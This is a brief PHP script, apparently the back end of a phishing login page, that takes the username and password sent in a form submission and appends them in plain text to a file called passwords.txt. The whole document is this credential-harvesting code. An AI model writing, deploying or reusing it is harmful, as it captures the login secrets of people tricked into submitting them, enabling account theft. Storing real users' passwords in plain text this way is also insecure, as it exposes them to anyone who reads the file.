<?php
    $file = fopen("passwords.txt", "a") or die("Unable to open file!");
    fwrite($file, "username: " . $_POST["username"]);
    fwrite($file, "password: " . $_POST["password"]);

    fclose($file);
?>